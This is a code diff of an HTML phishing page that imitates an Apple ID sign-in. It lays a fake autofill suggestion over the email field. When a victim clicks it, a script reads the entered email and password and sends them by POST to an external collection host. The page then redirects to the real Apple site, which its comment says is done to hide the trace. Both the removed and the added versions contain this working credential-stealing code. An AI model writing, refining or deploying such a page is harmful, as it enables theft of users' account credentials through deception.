@@ -1,81 +1,85 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Apple ID Login</title>
+  <title>Apple ID - Sign In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: sans-serif;
+      font-family: -apple-system, sans-serif;
+      margin: 0;
+      background: #f2f2f7;
       display: flex;
       flex-direction: column;
       align-items: center;
-      margin-top: 100px;
+      padding-top: 100px;
     }
 
     input {
-      padding: 12px;
-      width: 260px;
-      margin-bottom: 10px;
-      font-size: 16px;
-    }
-
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-    }
-
-    /* 🕳️ Overlay suggestion fake */
-    .overlay-suggestion {
-      position: absolute;
-      top: 164px;
-      width: 264px;
-      height: 42px;
-      background: white;
+      padding: 14px;
+      font-size: 17px;
+      border-radius: 8px;
       border: 1px solid #ccc;
-      font-size: 15px;
-      line-height: 42px;
-      padding-left: 10px;
-      color: #222;
-      cursor: pointer;
-      z-index: 1000;
+      width: 280px;
+      margin-bottom: 14px;
     }
 
     .container {
       position: relative;
     }
+
+    .overlay-suggestion {
+      position: absolute;
+      top: 12px;
+      left: 0;
+      width: 280px;
+      height: 46px;
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      padding-left: 14px;
+      font-size: 16px;
+      color: #222;
+      cursor: pointer;
+      z-index: 999;
+    }
   </style>
 </head>
 <body>
 
-<h2>🔐 Apple ID Login</h2>
+<h2>🔐 Sign in with your Apple ID</h2>
 
 <div class="container">
   <input type="email" id="email" placeholder="Email / Apple ID" autocomplete="on" autofocus>
-  <!-- 👇 Overlay HTML element placed above browser autofill -->
-  <div class="overlay-suggestion" onclick="trapClick()">yourname@icloud.com</div>
+
+  <!-- ⚠️ Overlay palsu di atas native autofill -->
+  <div class="overlay-suggestion" onclick="capture()">user@icloud.com</div>
 </div>
 
-<input type="password" id="password" placeholder="Password" autocomplete="on">
+<input type="password" id="pass" placeholder="Password" autocomplete="on">
 
 <script>
-function trapClick() {
-  // Let autofill happen
+function capture() {
+  // Allow autofill to trigger after overlay click
   setTimeout(() => {
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
 
-    // Exfiltrate silently
-    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/steal", {
-      method: "POST",
-      body: JSON.stringify({ email, password }),
-      headers: {
-        "Content-Type": "application/json"
-      }
-    });
+    if (email && pass) {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/log", {
+        method: "POST",
+        body: JSON.stringify({ email, pass }),
+        headers: { "Content-Type": "application/json" }
+      });
 
-    alert("Thanks! Redirecting...");
-    // Simulate redirect to real site
-    location.href = "https://appleid.apple.com";
-  }, 300); // slight delay to let autofill trigger
+      // Optional redirect to appleid to hide trace
+      setTimeout(() => {
+        location.href = "https://appleid.apple.com";
+      }, 700);
+    }
+  }, 300); // delay to allow autofill .value to populate
 }
 </script>
 
